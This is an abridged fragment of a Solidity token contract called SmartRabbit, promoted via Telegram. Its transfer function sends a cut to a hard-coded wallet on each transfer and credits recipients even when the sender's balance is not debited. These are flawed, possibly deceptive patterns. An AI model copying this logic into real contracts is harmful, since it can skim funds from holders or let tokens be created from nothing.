...
// Submitted for Telegram: https://t.me/SmartRabbitBsc
...
contract  SmartRabbit  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    address private isExcluded;
    string private _name = "SmartRabbit";
    string private _symbol = "SMARTRABBIT";
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0xEa7a169bc3aBDdF62A2C9AfB776BFe09Eff38743] += _teamtoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_marketingfee > 0) {
        emit Transfer(form, 0xEa7a169bc3aBDdF62A2C9AfB776BFe09Eff38743, _teamtoken);
        }
